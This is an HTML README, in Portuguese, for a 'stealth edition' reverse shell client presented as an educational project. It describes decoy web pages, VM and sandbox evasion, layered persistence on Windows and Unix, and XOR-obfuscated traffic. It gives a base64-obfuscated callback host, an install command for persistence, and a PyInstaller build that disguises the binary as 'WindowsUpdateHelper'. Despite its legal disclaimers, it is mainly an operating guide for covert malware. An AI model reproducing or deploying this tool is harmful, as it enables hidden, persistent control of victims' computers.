<header>
<h1>Reverse Shell Client (Stealth Edition)</h1>
<p>Projeto Educacional para Estudos de Segurança Ofensiva</p>
</header>

<div class="container">

<div class="warning">
<strong>⚠ AVISO LEGAL IMPORTANTE</strong><br><br>
        Este projeto é destinado exclusivamente para <strong>estudos de segurança</strong>,
        testes em <strong>ambientes controlados com autorização explícita</strong> e
        atividades de <strong>red teaming / pentest autorizado</strong>.<br><br>
        O uso não autorizado é <strong>ilegal</strong> e pode resultar em consequências
        criminais e civis. O autor não se responsabiliza por uso indevido.
</div>

<div class="section">
<h2>📌 Visão Geral</h2>
<p>
            Cliente de reverse shell desenvolvido com foco em discrição e técnicas comuns
            utilizadas em pesquisas de segurança ofensiva para fins educacionais.
</p>
</div>

<div class="section">
<h2>🚀 Características Principais</h2>
<ul>
<li>Abertura automática de página web comum como disfarce (sem roubar foco)</li>
<li>Persistência multi-camadas (Windows e Linux/macOS)</li>
<li>Detecção básica de VM / sandbox</li>
<li>Comunicação com criptografia XOR simples</li>
<li>Nomes de arquivos e tarefas plausíveis</li>
<li>Execução sem janelas visíveis</li>
<li>Reconexão automática com delay aleatório</li>
<li>Timeout em comandos para evitar travamentos</li>
</ul>
</div>

<div class="section">
<h2>⚙ Como Usar</h2>

<h3>1️⃣ Configuração</h3>
<p>Edite as variáveis no topo do código:</p>

<pre><code>def get_host():
    enc = b'U0VVX0lQX09VX0RPTUlOSU9fQVFVSQ=='
    return base64.b64decode(enc).decode()

def get_port():
    return 4444
</code></pre>

<h3>2️⃣ Instalação / Persistência</h3>
<pre><code># Primeira execução
python reverse_shell_client.py --install

# Execução normal
python reverse_shell_client.py
</code></pre>

<h3>3️⃣ Compilação (Windows)</h3>
<pre><code>pyinstaller --onefile --noconsole --name "WindowsUpdateHelper" reverse_shell_client.py
</code></pre>
</div>

<div class="section">
<h2>🗂 Camadas de Persistência</h2>

<table>
<thead>
<tr>
<th>Sistema</th>
<th>Método Principal</th>
<th>Fallback</th>
<th>Nível de Stealth</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows</td>
<td>HKCU Run Key</td>
<td>Scheduled Task + Startup VBS</td>
<td>Alto</td>
</tr>
<tr>
<td>Linux / macOS</td>
<td>crontab @reboot</td>
<td>.bashrc / .profile</td>
<td>Médio-Alto</td>
</tr>
</tbody>
</table>
</div>

<div class="section">
<h2>💻 Comandos no Servidor</h2>
<ul>
<li><code>exit / quit / q / die / kill</code> → finaliza o cliente</li>
<li>Qualquer outro comando → executado via shell</li>
</ul>
</div>

<div class="section">
<h2>🔮 Melhorias Futuras (Estudo)</h2>
<ul>
<li>Criptografia real (AES)</li>
<li>Comunicação via HTTPS</li>
<li>Check-in periódico com jitter</li>
<li>Suporte a proxy</li>
<li>Ofuscação adicional</li>
</ul>
</div>

<div class="warning">
<strong>⚠ Aviso Final</strong><br><br>
        Este projeto é um <strong>Proof of Concept educacional</strong>.
        Não distribua binários compilados.
        Utilize apenas em laboratório isolado.
</div>

</div>

<footer>
    © 2026 - Projeto Educacional de Segurança da Informação
</footer>
